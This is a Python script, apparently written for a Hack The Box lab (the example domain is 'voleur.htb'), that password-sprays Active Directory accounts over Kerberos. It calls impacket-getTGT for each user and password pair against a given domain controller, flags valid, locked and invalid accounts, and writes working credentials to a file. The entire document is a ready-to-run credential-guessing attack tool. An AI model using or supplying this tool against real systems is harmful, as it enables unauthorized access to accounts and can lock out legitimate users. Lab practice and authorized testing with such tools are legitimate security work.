import subprocess
from datetime import datetime
import argparse
import os

def banner(args):
    print(f"\n=== Kerberos Password Spray ({datetime.now().strftime('%Y-%m-%d %H:%M:%S')}) ===")
    print(f"Domain: {args.domain} | DC IP: {args.dc_ip}")
    print(f"Users: {args.users} | Passwords: {args.passwords}")
    print(f"Output: {args.output}")
    print("=" * 70)

def print_success(user, password):
    print(f"\033[92m[+] VALID     \033[0m {user:<20} : {password}")

def print_invalid(user, password):
    print(f"\033[91m[-] INVALID   \033[0m {user:<20} : {password}")

def print_locked(user):
    print(f"\033[93m[!] LOCKED    \033[0m {user:<20}")

def print_unknown(user, password, msg):
    print(f"\033[95m[?] UNKNOWN   \033[0m {user:<20} : {password} | {msg}")



parser = argparse.ArgumentParser(description="Kerberos Password Spray with impacket-getTGT")
parser.add_argument("-d", "--domain", required=True, help="Kerberos realm/domain (e.g., voleur.htb)")
parser.add_argument("--dc-ip", required=True, help="IP address of the Domain Controller")
parser.add_argument("-u", "--users", required=True, help="Path to user list file")
parser.add_argument("-p", "--passwords", required=True, help="Path to password list file")
parser.add_argument("-o", "--output", default="valid_creds.txt", help="File to save valid credentials")
args = parser.parse_args()


if not os.path.exists(args.users) or not os.path.exists(args.passwords):
    print("[!] User or password file not found.")
    exit(1)

with open(args.users, "r") as ufile:
    users = [line.strip() for line in ufile if line.strip()]

with open(args.passwords, "r") as pfile:
    passwords = [line.strip() for line in pfile if line.strip()]

banner(args)

for password in passwords:
    print(f"\n Trying password: \033[94m{password}\033[0m")
    for user in users:
        try:
            result = subprocess.run(
                [
                    "impacket-getTGT",
                    f"{args.domain}/{user}:{password}",
                    "-dc-ip", args.dc_ip
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            output = result.stdout + result.stderr

            if "Saving ticket in" in output:
                print_success(user, password)
                with open(args.output, "a") as out:
                    out.write(f"{user}:{password}\n")
            elif "KDC_ERR_CLIENT_REVOKED" in output:
                print_locked(user)
            elif "KDC_ERR_PREAUTH_FAILED" in output:
                print_invalid(user, password)
            else:
                print_unknown(user, password, output.splitlines()[-1])

        except Exception as e:
            print_unknown(user, password, f"Exception: {e}")
